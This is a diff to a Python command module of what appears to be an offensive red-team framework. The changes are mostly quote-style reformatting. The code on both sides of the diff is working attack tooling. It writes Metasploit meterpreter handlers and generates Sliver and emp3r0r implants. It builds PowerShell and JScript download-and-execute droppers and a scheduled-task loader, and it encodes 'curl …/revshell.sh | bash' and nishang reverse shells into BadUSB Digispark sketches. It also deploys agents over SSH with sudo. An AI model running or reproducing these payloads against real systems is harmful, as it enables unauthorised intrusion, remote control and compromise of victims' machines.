@@ -327,7 +327,7 @@ def select_agent_flavour(run_tests: list[str], platform: str) -> str:
 
 
 for _lazy_name in dir(_lazy_utils):
-    if not _lazy_name.startswith('_'):
+    if not _lazy_name.startswith("_"):
         globals().setdefault(_lazy_name, getattr(_lazy_utils, _lazy_name))
 
 
@@ -384,10 +384,10 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
         """
 
         if not line:
-            rhost = self.params['rhost']
-            if not check_rhost(self.params['rhost']):
+            rhost = self.params["rhost"]
+            if not check_rhost(self.params["rhost"]):
                 return
-            TARGET_IP = self.params['rhost']
+            TARGET_IP = self.params["rhost"]
             rc_file_path = "/tmp/scan_vulnerabilities.rc"
 
             with open(rc_file_path, "w") as file:
@@ -421,7 +421,6 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
             # Terminate session
             exit
             """)
-
 
             subprocess.run(["msfconsole", "-r", rc_file_path], check=True)
 
@@ -501,13 +500,12 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
                             return
                     print_msg(f"Selected payload: {setpayload}")
 
-
                 else:
                     print_error("Invalid platform specified")
 
-            lhost = self.params['lhost']
-            lport = self.params['lport']
-            if not self.params['lhost'] or not lport:
+            lhost = self.params["lhost"]
+            lport = self.params["lport"]
+            if not self.params["lhost"] or not lport:
                 print_error(f"self.params['lhost'] or lport must be assign use assign self.params['lhost'] <ip>{RESET}")
                 return
             lhost = f"{self.params['lhost']}"
@@ -519,7 +517,7 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
                 file.write(f"""
                 use exploit/multi/handler
                 set payload {setpayload}
-                set LHOST {self.params['lhost']}
+                set LHOST {self.params["lhost"]}
                 set LPORT {lport}
                 run
                 """)
@@ -531,9 +529,9 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
             return
 
         elif line.startswith("lnk"):
-            lhost = self.params['lhost']
-            lport = self.params['lport']
-            if not self.params['lhost'] or not lport:
+            lhost = self.params["lhost"]
+            lport = self.params["lport"]
+            if not self.params["lhost"] or not lport:
                 print_error(f"self.params['lhost'] or lport must be assign use assign self.params['lhost'] <ip>{RESET}")
                 return
 
@@ -543,7 +541,7 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
             web_root = "sessions"
             payload = "C:\\xampp\\htdocs\\payload.exe"
             args = line.split(" ")
-            if not self.params['lhost'] or not lport:
+            if not self.params["lhost"] or not lport:
                 print_error(
                     "self.params['lhost'] o lport deben estar establecidos. Usa 'assign self.params['lhost'] <ip>'"
                 )
@@ -587,7 +585,7 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
                 <job>
                 <script language="JScript">
                     var objShell = new ActiveXObject("WScript.Shell");
-                    var objExec = objShell.Exec("cmd.exe /c powershell -Command \\"Invoke-WebRequest -Uri 'http://{self.params['lhost']}/payload.exe' -OutFile 'C:\\Windows\\Temp\\payload.exe'; Start-Process 'C:\\Windows\\Temp\\payload.exe'\\"");
+                    var objExec = objShell.Exec("cmd.exe /c powershell -Command \\"Invoke-WebRequest -Uri 'http://{self.params["lhost"]}/payload.exe' -OutFile 'C:\\Windows\\Temp\\payload.exe'; Start-Process 'C:\\Windows\\Temp\\payload.exe'\\"");
                 </script>
                 </job>
                 """
@@ -607,12 +605,10 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
                     ps_script_file.write(ps_script_content)
 
                 print_msg(f"Script de PowerShell creado en {ps_script_path}")
-                print_msg(
-                    "Run this script on the Windows machine to create the .lnk file:"
-                )
+                print_msg("Run this script on the Windows machine to create the .lnk file:")
                 print(ps_script_content)
 
-                cmd = f"""echo 'powershell -Command \\"Invoke-WebRequest -Uri \'http://{self.params['lhost']}/create_lnk.ps1\' -OutFile \'C:\\Windows\\Temp\\create_lnk.ps1\'; schtasks /create /tn \'DownloadPayload\' /ps1 \'C:\\Windows\\Temp\\create_lnk.ps1\' /f; schtasks /run /tn \'DownloadPayload\' ; powershell -ExecutionPolicy Bypass -File create_lnk.ps1' | xclip -sel clip"""
+                cmd = f"""echo 'powershell -Command \\"Invoke-WebRequest -Uri \'http://{self.params["lhost"]}/create_lnk.ps1\' -OutFile \'C:\\Windows\\Temp\\create_lnk.ps1\'; schtasks /create /tn \'DownloadPayload\' /ps1 \'C:\\Windows\\Temp\\create_lnk.ps1\' /f; schtasks /run /tn \'DownloadPayload\' ; powershell -ExecutionPolicy Bypass -File create_lnk.ps1' | xclip -sel clip"""
                 print_msg(
                     f"El payload y los archivos necesarios han sido generados exitosamente. el comando {cmd} se copio en la clipboard, ejecute www para diponer los archivos mediante un servidor web"
                 )
@@ -621,9 +617,9 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
 
         elif line.startswith("autoroute"):
             args = line.split(" ")
-            lhost = self.params['lhost']
-            lport = self.params['lport']
-            if not self.params['lhost'] or not lport:
+            lhost = self.params["lhost"]
+            lport = self.params["lport"]
+            if not self.params["lhost"] or not lport:
                 print_error(f"self.params['lhost'] or lport must be assign use assign self.params['lhost'] <ip>{RESET}")
                 return
             if len(args) == 1:
@@ -642,9 +638,7 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
                 elif args[1] == "mac64":
                     setpayload = "osx/x64/meterpreter/reverse_tcp"
 
-            session_id = (
-                "1"
-            )
+            session_id = "1"
             target_subnet = "192.168.100.0"
             netmask = "255.255.255.0"
             rc_file_path = "/tmp/autoroute.rc"
@@ -653,7 +647,7 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
                 file.write(f"""
             use exploit/multi/handler
             set payload {setpayload}
-            set LHOST {self.params['lhost']}
+            set LHOST {self.params["lhost"]}
             set LPORT {lport}
             exploit -j -z
 
@@ -677,12 +671,8 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
             # proxychains_conf_path = '/etc/proxychains.conf'
             # with open(proxychains_conf_path, 'a') as file:
             #    file.write("\nsocks4 127.0.0.1 1080")
-            print_msg(
-                "Proxychains is configured to use the Metasploit SOCKS proxy on 127.0.0.1:1080"
-            )
-            print_msg(
-                "You can now use proxychains with your tools, e.g., proxychains nmap -sT -Pn <target_ip>"
-            )
+            print_msg("Proxychains is configured to use the Metasploit SOCKS proxy on 127.0.0.1:1080")
+            print_msg("You can now use proxychains with your tools, e.g., proxychains nmap -sT -Pn <target_ip>")
 
             # Cleanup
             if os.path.exists(rc_file_path):
@@ -742,11 +732,11 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
                 line = args[0]
                 if num_args == 2:
                     potential_choice = args[1]
-                    if potential_choice in ['1', '2', '3', '4', '5', '6', '7']:
+                    if potential_choice in ["1", "2", "3", "4", "5", "6", "7"]:
                         choice = potential_choice
-                    elif potential_choice == '1':
+                    elif potential_choice == "1":
                         use_tunnel = True
-                    elif potential_choice == '0':
+                    elif potential_choice == "0":
                         use_tunnel = False
                     else:
                         print_error("Invalid option. Use '1' for tunnel, or target choice [1-7].")
@@ -754,15 +744,17 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
                 elif num_args == 3:
                     line = args[0]
                     choice = args[1]
-                    if args[2] == '1':
+                    if args[2] == "1":
                         use_tunnel = True
-                    elif args[2] == '0':
+                    elif args[2] == "0":
                         use_tunnel = False
                     else:
                         print_error("Invalid tunnel option. Use '1' or '0'.")
                         return
             else:
-                print_error("You need to specify the victim-id, for example: c2 victim-1. [1 win ps1 | 2 linux | 3 win bat] ")
+                print_error(
+                    "You need to specify the victim-id, for example: c2 victim-1. [1 win ps1 | 2 linux | 3 win bat] "
+                )
                 return
         else:
             try:
@@ -771,7 +763,9 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
                 print_warn("c2 cancelled.")
                 return
             if not line:
-                print_error("You need to specify the victim-id, for example: c2 victim-1. [1 win ps1 | 2 linux | 3 win bat] ")
+                print_error(
+                    "You need to specify the victim-id, for example: c2 victim-1. [1 win ps1 | 2 linux | 3 win bat] "
+                )
                 return
 
         builder = C2Builder(
@@ -780,8 +774,8 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
             cmd_fn=self.cmd,
             onecmd_fn=self.onecmd,
             toastr_fn=self.display_toastr,
-            c2_user=self.params['c2_user'],
-            c2_pass=self.params['c2_pass'],
+            c2_user=self.params["c2_user"],
+            c2_pass=self.params["c2_pass"],
         )
         result = builder.run(line, choice, use_tunnel)
         if not result:
@@ -800,8 +794,8 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
             self.cmd(command)
             print_msg(f"Agent {line}/{platform} Crafted.")
         else:
-            choice = input(f"    {CYAN}[?] start C2 Server ? (yes/no): ") or 'yes'
-            if choice == 'yes':
+            choice = input(f"    {CYAN}[?] start C2 Server ? (yes/no): ") or "yes"
+            if choice == "yes":
                 command = "cp modules/backdoor/*.h sessions && cd sessions && x86_64-w64-mingw32-gcc -o b.exe b.c -lwininet -lwsock32 && gcc -o server server.c && cd .."
                 self.cmd(command)
                 print_msg("Credentials stored in sessions/credentials_c2.txt")
@@ -889,12 +883,16 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
                     print_warn(f"A listener on port {port} already exists ({entry.get('id')}).")
                     return
             listener = mgr.add(port=port, ssl=ssl_flag)
-            api_result = _api("POST", "listeners", {
-                "id": listener.id,
-                "port": port,
-                "ssl": ssl_flag,
-                "start": True,
-            })
+            api_result = _api(
+                "POST",
+                "listeners",
+                {
+                    "id": listener.id,
+                    "port": port,
+                    "ssl": ssl_flag,
+                    "start": True,
+                },
+            )
             if api_result and api_result.get("status") == "ok":
                 print_succ(f"Listener {listener.id} added and started on port {port}.")
             else:
@@ -1032,23 +1030,21 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
             print_warn("Installing sliver-server...")
             self.cmd("sudo apt install sliver-server -y")
 
-        rhost = self.params['rhost']
-        if not check_rhost(self.params['rhost']):
+        rhost = self.params["rhost"]
+        if not check_rhost(self.params["rhost"]):
             return
 
-        lhost = self.params['lhost']
-        if not check_lhost(self.params['lhost']):
+        lhost = self.params["lhost"]
+        if not check_lhost(self.params["lhost"]):
             return
 
-        lport = self.params['lport']
+        lport = self.params["lport"]
         if not check_lport(lport):
             return
         path = os.getcwd()
         if not line:
             print_error("You need pass hte name of the victim")
             return
-
-
 
         print_msg("download the sliver client")
         time.sleep(3)
@@ -1084,22 +1080,22 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
         print_msg("Starting the Sliver server...")
         cmd = "cd sessions && sliver-server"
         if choice == "1":
-            command = f"""profiles new --mtls {self.params['lhost']} --format exe win-exe
-            stage-listener --url http://{self.params['lhost']}:{lport} --profile win-exe
-            generate --mtls {self.params['lhost']} --http {lport} --os windows --format exe --save {path}/sessions/windows-implant.exe
+            command = f"""profiles new --mtls {self.params["lhost"]} --format exe win-exe
+            stage-listener --url http://{self.params["lhost"]}:{lport} --profile win-exe
+            generate --mtls {self.params["lhost"]} --http {lport} --os windows --format exe --save {path}/sessions/windows-implant.exe
             mtls
             jobs
-            """.replace("        ","")
+            """.replace("        ", "")
 
             copy2clip(command)
 
         elif choice == "2":
-            command = f"""profiles new --mtls {self.params['lhost']} --format elf linux-elf
-            stage-listener --url http://{self.params['lhost']}:{lport} --profile linux-elf
-            generate --mtls {self.params['lhost']} --http {lport} --os linux --format elf --save {path}/sessions/linux-implant
+            command = f"""profiles new --mtls {self.params["lhost"]} --format elf linux-elf
+            stage-listener --url http://{self.params["lhost"]}:{lport} --profile linux-elf
+            generate --mtls {self.params["lhost"]} --http {lport} --os linux --format elf --save {path}/sessions/linux-implant
             mtls
             jobs
-            """.replace("        ","")
+            """.replace("        ", "")
 
             copy2clip(command)
 
@@ -1112,7 +1108,9 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
 
         self.onecmd("tab bin2shellcode")
         try:
-            self.cmd(f"sliver-server operator -l {self.params['lhost']} -p {lport} -n {line} -s sessions/{line}_file.cfg")
+            self.cmd(
+                f"sliver-server operator -l {self.params['lhost']} -p {lport} -n {line} -s sessions/{line}_file.cfg"
+            )
             self.cmd(cmd)
             print_msg("Sliver server started successfully.")
         except subprocess.CalledProcessError as e:
@@ -1143,7 +1141,7 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
             "windows_launcher_vbs": "launcher vbs",
             "windows_launcher_exe": "launcher exe",
             "windows_macro": "macro",
-            "windows_dll": "dll"
+            "windows_dll": "dll",
         }
 
         # User input for selecting payload type and parameters
@@ -1157,12 +1155,12 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
             return
 
         selected_type = list(options.keys())[type_choice]
-        lhost = self.params['lhost']
-        lport = self.params['lport']
+        lhost = self.params["lhost"]
+        lport = self.params["lport"]
         params = {
-            "self.params['lhost']": self.params['lhost'],
+            "self.params['lhost']": self.params["lhost"],
             "lport": lport,
-            "output_file": f"sessions/payload_{self.params['lhost']}_{lport}.txt"
+            "output_file": f"sessions/payload_{self.params['lhost']}_{lport}.txt",
         }
 
         empire_command = f"sudo powershell-empire client -p {options[selected_type]} -lhost {params['lhost']} -lport {params['lport']} -o {params['output_file']}"
@@ -1180,40 +1178,42 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
         :returns: None
         """
 
-        rhost = self.params['rhost']
-        lhost = self.params['lhost']
-        lport = self.params['lport']
-        ultimo_elemento = line.split('/')[-1]
+        rhost = self.params["rhost"]
+        lhost = self.params["lhost"]
+        lport = self.params["lport"]
+        ultimo_elemento = line.split("/")[-1]
 
-        if not self.params['rhost'] or not self.params['lhost']:
+        if not self.params["rhost"] or not self.params["lhost"]:
             print_warn("RHOST and LHOST must be specified.")
             return
 
         if not (line or "").strip() or "/" not in line:
-            print_error("automsf needs a Metasploit module path "
-                        "(e.g. automsf exploit/windows/iis/iis_webdav_upload_asp)")
+            print_error(
+                "automsf needs a Metasploit module path (e.g. automsf exploit/windows/iis/iis_webdav_upload_asp)"
+            )
             return
 
         rc_file_path = f"/tmp/{ultimo_elemento}.rc"
         with open(rc_file_path, "w") as file:
             file.write(f"""
             use {line}
-            set RHOSTS {self.params['rhost']}
-            set LHOST {self.params['lhost']}
+            set RHOSTS {self.params["rhost"]}
+            set LHOST {self.params["lhost"]}
             set LPORT {lport}
             run
             """)
 
         try:
-            subprocess.run(["msfconsole", "-r", rc_file_path], check=True,
-                           stdin=subprocess.DEVNULL)
+            subprocess.run(["msfconsole", "-r", rc_file_path], check=True, stdin=subprocess.DEVNULL)
         except Exception as exc:
             print_error(f"msfconsole failed: {exc}")
 
         if os.path.exists(rc_file_path):
             os.remove(rc_file_path)
 
-        print_msg(f"Executed {ultimo_elemento} exploitation on {self.params['rhost']} with listener {self.params['lhost']}.")
+        print_msg(
+            f"Executed {ultimo_elemento} exploitation on {self.params['rhost']} with listener {self.params['lhost']}."
+        )
         return
 
     @cmd2.with_category("10. Command & Control")
@@ -1225,11 +1225,11 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
         :returns: None
         """
 
-        rhost = self.params['rhost']
-        lhost = self.params['lhost']
-        lport = self.params['lport']
+        rhost = self.params["rhost"]
+        lhost = self.params["lhost"]
+        lport = self.params["lport"]
 
-        if not self.params['rhost'] or not self.params['lhost']:
+        if not self.params["rhost"] or not self.params["lhost"]:
             print_warn("RHOST and LHOST must be specified.")
             return
 
@@ -1237,8 +1237,8 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
         with open(rc_file_path, "w") as file:
             file.write(f"""
             use exploit/windows/iis/iis_webdav_upload_asp
-            set RHOSTS {self.params['rhost']}
-            set LHOST {self.params['lhost']}
+            set RHOSTS {self.params["rhost"]}
+            set LHOST {self.params["lhost"]}
             set LPORT {lport}
             run
             """)
@@ -1248,7 +1248,9 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
         if os.path.exists(rc_file_path):
             os.remove(rc_file_path)
 
-        print_msg(f"Executed iis_webdav_upload_asp exploitation on {self.params['rhost']} with listener {self.params['lhost']}.")
+        print_msg(
+            f"Executed iis_webdav_upload_asp exploitation on {self.params['rhost']} with listener {self.params['lhost']}."
+        )
         return
 
     @cmd2.with_category("10. Command & Control")
@@ -1288,18 +1290,18 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
         if not is_binary_present("micronucleus"):
             print_warn("Micronucleus not found, installing...")
             self.cmd("sudo apt-get install -y micronucleus")
-        payload_type = input("    [!] Payload target (1: Windows, 2: Linux, 3: Android): ").strip() or '1'
+        payload_type = input("    [!] Payload target (1: Windows, 2: Linux, 3: Android): ").strip() or "1"
 
-        if payload_type == '2':
+        if payload_type == "2":
             self.onecmd("createrevshell")
-            lhost = self.params['lhost']
-            if not check_lhost(self.params['lhost']):
+            lhost = self.params["lhost"]
+            if not check_lhost(self.params["lhost"]):
                 return
             rev = f"curl http://{self.params['lhost']}/revshell.sh | bash"
             print_msg(rev)
 
-            encoded_bytes = base64.b64encode(rev.encode('utf-8'))
-            encoded_str = encoded_bytes.decode('utf-8')
+            encoded_bytes = base64.b64encode(rev.encode("utf-8"))
+            encoded_str = encoded_bytes.decode("utf-8")
             payload = f"echo '{encoded_str}' | base64 -d | bash"
 
             print_msg(encoded_str)
@@ -1317,7 +1319,7 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
             content = content.replace("{payload}", payload)
             self.cmd(f"mkdir {path}/sessions/revshell")
             file_ino = f"{path}/sessions/revshell/revshell.ino"
-            with open(file_ino, 'w+') as f:
+            with open(file_ino, "w+") as f:
                 f.write(content)
 
             if not is_exist(file_ino):
@@ -1332,7 +1334,9 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
 
             print_msg(f"Compiling the sketch {file_ino}...")
             output_dir = f"{path}/sessions/revshell"
-            compile_command = f"arduino-cli compile --fqbn digistump:avr:digispark-tiny {file_ino} --output-dir {output_dir}"
+            compile_command = (
+                f"arduino-cli compile --fqbn digistump:avr:digispark-tiny {file_ino} --output-dir {output_dir}"
+            )
             print_msg(compile_command)
             self.cmd(compile_command)
 
@@ -1342,11 +1346,11 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
             print_msg(upload_command)
             self.cmd(upload_command)
 
-        elif payload_type == '1':
-            lhost = self.params['lhost']
-            lport = self.params['lport']
+        elif payload_type == "1":
+            lhost = self.params["lhost"]
+            lport = self.params["lport"]
             path = os.getcwd()
-            if not check_lhost(self.params['lhost']):
+            if not check_lhost(self.params["lhost"]):
                 return
             download = "cd sessions && wget https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1"
             print_msg(download)
@@ -1354,10 +1358,12 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
             editor = f"echo 'Invoke-PowerShellTcp -Reverse -IPAddress {self.params['lhost']} -Port {lport}' >> Invoke-PowerShellTcp.ps1"
             print_msg(editor)
             self.cmd(editor)
-            payload = "IEX(New-Object Net.WebClient).DownloadString('http://{self.params['lhost']}/Invoke-PowerShellTcp.ps1')".replace("{self.params['lhost']}",self.params['lhost'])
+            payload = "IEX(New-Object Net.WebClient).DownloadString('http://{self.params['lhost']}/Invoke-PowerShellTcp.ps1')".replace(
+                "{self.params['lhost']}", self.params["lhost"]
+            )
             print_msg(payload)
-            utf16_command = payload.encode('utf-16le')
-            base64_command = base64.b64encode(utf16_command).decode('utf-8')
+            utf16_command = payload.encode("utf-16le")
+            base64_command = base64.b64encode(utf16_command).decode("utf-8")
             payload = base64_command
             ino_file = "digispark_win.ino"
             print_msg(f"Generated Windows payload: powershell /enc  {payload}")
@@ -1372,7 +1378,7 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
             content = content.replace("{payload}", payload)
             self.cmd(f"mkdir {path}/sessions/winrevshell")
             file_ino = f"{path}/sessions/winrevshell/winrevshell.ino"
-            with open(file_ino, 'w+') as f:
+            with open(file_ino, "w+") as f:
                 f.write(content)
 
             if not is_exist(file_ino):
@@ -1387,7 +1393,9 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
 
             print_msg(f"Compiling the sketch {file_ino}...")
             output_dir = f"{path}/sessions/winrevshell"
-            compile_command = f"arduino-cli compile --fqbn digistump:avr:digispark-tiny {file_ino} --output-dir {output_dir}"
+            compile_command = (
+                f"arduino-cli compile --fqbn digistump:avr:digispark-tiny {file_ino} --output-dir {output_dir}"
+            )
             print_msg(compile_command)
             self.cmd(compile_command)
 
@@ -1397,15 +1405,13 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
             print_msg(upload_command)
             self.cmd(upload_command)
 
-        elif payload_type == '3':
-
-            lhost = self.params['lhost']
-            lport = self.params['lport']
+        elif payload_type == "3":
+            lhost = self.params["lhost"]
+            lport = self.params["lport"]
             path = os.getcwd()
-            if not check_lhost(self.params['lhost']):
+            if not check_lhost(self.params["lhost"]):
                 return
             ino_file = "digispark_android.ino"
-
 
             path = os.getcwd()
             file = f"{path}/modules/{ino_file}"
@@ -1415,11 +1421,11 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
             with open(file) as f:
                 content = f.read()
 
-            payload = input(f"Enter url to force visit. to get one use:{GREEN} stormbreaker: " )
+            payload = input(f"Enter url to force visit. to get one use:{GREEN} stormbreaker: ")
             content = content.replace("{payload}", payload)
             self.cmd(f"mkdir {path}/sessions/androidbrowser")
             file_ino = f"{path}/sessions/androidbrowser/androidbrowser.ino"
-            with open(file_ino, 'w+') as f:
+            with open(file_ino, "w+") as f:
                 f.write(content)
 
             if not is_exist(file_ino):
@@ -1434,7 +1440,9 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
 
             print_msg(f"Compiling the sketch {file_ino}...")
             output_dir = f"{path}/sessions/androidbrowser"
-            compile_command = f"arduino-cli compile --fqbn digistump:avr:digispark-tiny {file_ino} --output-dir {output_dir}"
+            compile_command = (
+                f"arduino-cli compile --fqbn digistump:avr:digispark-tiny {file_ino} --output-dir {output_dir}"
+            )
             print_msg(compile_command)
             self.cmd(compile_command)
 
@@ -1448,7 +1456,7 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
             print_error("Invalid payload target.")
             return
         print_msg("Upload completed.")
-        if not payload_type == '3':
+        if not payload_type == "3":
             self.onecmd("nc")
         return
 
@@ -1480,8 +1488,8 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
         sessions_dir = os.path.join(path, "sessions")
         emperor_url = "https://github.com/jm33-m0/emp3r0r/releases/download/v1.37.4/emp3r0r-v1.37.4.tar.xz"
         emperor_tar = os.path.join(sessions_dir, "emp3r0r.tar.xz")
-        lhost = self.params['lhost']
-        lport = self.params['lport']
+        lhost = self.params["lhost"]
+        lport = self.params["lport"]
         os.makedirs(sessions_dir, exist_ok=True)
         emperor_dir = os.path.join(sessions_dir, "emp3r0r-build")
         command_server = f"{emperor_dir}/emp3r0r -relay_server {lport}"
@@ -1496,15 +1504,15 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
         else:
             print_msg("    [!] Emperor already downloaded, skipping download.")
 
-        choice = input("    [?] If the target is Windows choice 1 or 2 to Linux") or '2'
+        choice = input("    [?] If the target is Windows choice 1 or 2 to Linux") or "2"
         if not line:
-            relay = input("    [!] Enter port Relay (default: 6666): ") or '6666'
+            relay = input("    [!] Enter port Relay (default: 6666): ") or "6666"
         else:
             relay = line
 
-        if choice == '1':
+        if choice == "1":
             download_command = f"powershell -Command \"(New-Object System.Net.WebClient).DownloadFile('http://{self.params['lhost']}/emp3r0r-build/emp3r0r.exe', 'agent.exe'); Start-Process -FilePath 'agent.exe' -ArgumentList '/S'\""
-        elif choice == '2':
+        elif choice == "2":
             download_command = f"wget http://{self.params['lhost']}/emp3r0r-build/emp3r0r -O emp3r0r && chmod +x emp3r0r && ./emp3r0r --install && ./emp3r0r -connect_relay {self.params['lhost']}:{lport} -relayed_port {relay}"
         else:
             print_warn("Wrong Choice")
@@ -1579,11 +1587,7 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
             report = json.loads(reports[-1].read_text(encoding="utf-8"))
         except (OSError, ValueError):
             return []
-        return [
-            row
-            for row in (report.get("attempts") or [])
-            if row.get("shell") and row.get("id")
-        ]
+        return [row for row in (report.get("attempts") or []) if row.get("shell") and row.get("id")]
 
     @cmd2.with_category("10. Command & Control")
     def do_atomic_shell(self, line):
@@ -1630,7 +1634,9 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
             if not out.get("ok"):
                 print_warn(f"Resume failed: {out.get('error', 'unknown')}")
                 return
-            print_msg(f"[+] resumed shell {out['id']} on {out['target']} via {out['via']} (resume #{out['resume_count']})")
+            print_msg(
+                f"[+] resumed shell {out['id']} on {out['target']} via {out['via']} (resume #{out['resume_count']})"
+            )
             record_shell_outcome(out["target"], via=str(out.get("via", "") or ""))
             if interactive:
                 interactive_shell(out["target"], interactive=True)
@@ -1644,7 +1650,7 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
         result = interactive_shell(target, interactive=interactive)
         if result.get("live"):
             record_shell_outcome(target, via=str(result.get("via", "") or ""))
-        for row in (result.get("sessions") or []):
+        for row in result.get("sessions") or []:
             print_msg(f"[+] shell live {row.get('target')} via {row.get('via')}")
         evidence = self._latest_sweep_evidence(target)
         if evidence:
@@ -1842,8 +1848,12 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
         sessions_path = os.path.join(os.getcwd(), "sessions")
         tmp_path = "/tmp/lazyown_atomic_test"
         self.cmd(f"mkdir -p {tmp_path}")
-        test_scripts = glob.glob(os.path.join(sessions_path, "atomic_test_*.sh")) + glob.glob(os.path.join(sessions_path, "atomic_test_*.ps1"))
-        clean_test_scripts = glob.glob(os.path.join(sessions_path, "atomic_clean_test_*.sh")) + glob.glob(os.path.join(sessions_path, "atomic_clean_test_*.ps1"))
+        test_scripts = glob.glob(os.path.join(sessions_path, "atomic_test_*.sh")) + glob.glob(
+            os.path.join(sessions_path, "atomic_test_*.ps1")
+        )
+        clean_test_scripts = glob.glob(os.path.join(sessions_path, "atomic_clean_test_*.sh")) + glob.glob(
+            os.path.join(sessions_path, "atomic_clean_test_*.ps1")
+        )
 
         if not test_scripts or not clean_test_scripts:
             print_warn("No test or clean test scripts found in the sessions directory.")
@@ -1856,16 +1866,30 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
             return
         win_atomic_path = f"{win_drop_path}\\lazyown_atomic_test"
         if extension == ".sh":
-            atomic_agent_content = "\n".join([f"/bin/sh {os.path.join(tmp_path, os.path.basename(script))}" for script in test_scripts])
+            atomic_agent_content = "\n".join(
+                [f"/bin/sh {os.path.join(tmp_path, os.path.basename(script))}" for script in test_scripts]
+            )
         else:
-            atomic_agent_content = "\n".join([f"Start-Process powershell.exe -ArgumentList '-File', '{win_atomic_path}/{os.path.basename(script)}' -Verb RunAs" for script in test_scripts])
+            atomic_agent_content = "\n".join(
+                [
+                    f"Start-Process powershell.exe -ArgumentList '-File', '{win_atomic_path}/{os.path.basename(script)}' -Verb RunAs"
+                    for script in test_scripts
+                ]
+            )
         atomic_agent_path = os.path.join(tmp_path, f"atomic_agent{extension}")
         with open(atomic_agent_path, "w") as f:
             f.write(atomic_agent_content)
         if extension == ".sh":
-            atomic_clean_agent_content = "\n".join([f"/bin/bash {os.path.join(tmp_path, os.path.basename(script))}" for script in clean_test_scripts])
+            atomic_clean_agent_content = "\n".join(
+                [f"/bin/bash {os.path.join(tmp_path, os.path.basename(script))}" for script in clean_test_scripts]
+            )
         else:
-            atomic_clean_agent_content = "\n".join([f"Start-Process powershell.exe -ArgumentList '-File', '{win_atomic_path}/{os.path.basename(script)}' -Verb RunAs" for script in clean_test_scripts])
+            atomic_clean_agent_content = "\n".join(
+                [
+                    f"Start-Process powershell.exe -ArgumentList '-File', '{win_atomic_path}/{os.path.basename(script)}' -Verb RunAs"
+                    for script in clean_test_scripts
+                ]
+            )
         atomic_clean_agent_path = os.path.join(tmp_path, f"atomic_clean_agent{extension}")
         with open(atomic_clean_agent_path, "w") as f:
             f.write(atomic_clean_agent_content)
@@ -1888,17 +1912,46 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
                     username = self.params.get("username") or input("    [!] Enter the username: ")
                     password = self.params.get("password") or input("    [!] Enter the password: ")
 
-        rhost = self.params['rhost']
+        rhost = self.params["rhost"]
         sudo_pass = self.params.get("start_pass", "CHANGE_ME")
         print_msg("Deploying agent.")
         from core.hardening import set_sshpass_env
+
         _env = set_sshpass_env(password)
         if extension == ".sh":
-            scp_args = ["sshpass", "-e", "scp", "-r", f"{tmp_path}/", f"{username}@{self.params['rhost']}:/tmp/lazyown_atomic_test"]
-            ssh_args = ["sshpass", "-e", "ssh", f"{username}@{self.params['rhost']}", f"cd /tmp/lazyown_atomic_test/ && chmod +x /tmp/lazyown_atomic_test/* && echo \"{sudo_pass}\" | sudo -S /tmp/lazyown_atomic_test/atomic_agent.sh"]
+            scp_args = [
+                "sshpass",
+                "-e",
+                "scp",
+                "-r",
+                f"{tmp_path}/",
+                f"{username}@{self.params['rhost']}:/tmp/lazyown_atomic_test",
+            ]
+            ssh_args = [
+                "sshpass",
+                "-e",
+                "ssh",
+                f"{username}@{self.params['rhost']}",
+                f'cd /tmp/lazyown_atomic_test/ && chmod +x /tmp/lazyown_atomic_test/* && echo "{sudo_pass}" | sudo -S /tmp/lazyown_atomic_test/atomic_agent.sh',
+            ]
         else:
-            scp_args = ["sshpass", "-e", "scp", "-r", f"{tmp_path}/", f"{username}@{self.params['rhost']}:{win_drop_path}/"]
